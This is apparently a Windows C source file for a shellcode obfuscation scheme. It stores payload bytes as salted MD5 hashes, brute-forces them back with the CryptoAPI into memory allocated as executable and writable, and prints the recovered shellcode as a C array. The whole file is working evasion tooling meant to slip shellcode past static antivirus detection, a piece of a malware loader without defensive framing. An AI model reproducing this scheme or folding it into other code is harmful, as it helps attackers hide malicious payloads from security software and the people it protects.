#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include "shellcode.h"

#pragma comment(lib, "advapi32.lib")

void decode_md5(const char *encoded[], int elements, unsigned char *shellcode, int salt)
{
    HCRYPTPROV hProv = 0;
    BYTE digest[16];
    DWORD digest_len;
    CHAR hex_char[] = "0123456789abcdef";
    char md5_str[33];
    char str[16];

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        return;

    for (int i = 0; i < elements; i++)
    {
        for (int j = 0; j <= 255; j++)
        {
            HCRYPTHASH hHash = 0;
            digest_len = 16;

            if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))
                continue;

            sprintf_s(str, sizeof(str), "%d%d", j, salt);

            if (CryptHashData(hHash, (BYTE *)str, (DWORD)strlen(str), 0) &&
                CryptGetHashParam(hHash, HP_HASHVAL, digest, &digest_len, 0))
            {
                for (DWORD k = 0; k < digest_len; k++)
                {
                    md5_str[k * 2] = hex_char[digest[k] >> 4];
                    md5_str[k * 2 + 1] = hex_char[digest[k] & 0xF];
                }
                md5_str[32] = '\0';

                if (strcmp(md5_str, encoded[i]) == 0)
                {
                    shellcode[i] = (unsigned char)j;
                    CryptDestroyHash(hHash);
                    break;
                }
            }

            CryptDestroyHash(hHash);
        }
    }

    CryptReleaseContext(hProv, 0);
}

int main()
{
    LPVOID shellcode = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (shellcode == NULL)
        return 1;

    decode_md5(encoded, sizeof(encoded) / sizeof(encoded[0]), (unsigned char *)shellcode, shellcode_len);

    printf("\nunsigned char shellcode[] = {");
    for (unsigned int i = 0; i < shellcode_len; i++)
    {
        if (i % 20 == 0)
            printf("\n\t");
        printf("0x%02x,", ((unsigned char *)shellcode)[i]);
    }
    printf("\n};\n");

    return 0;
}
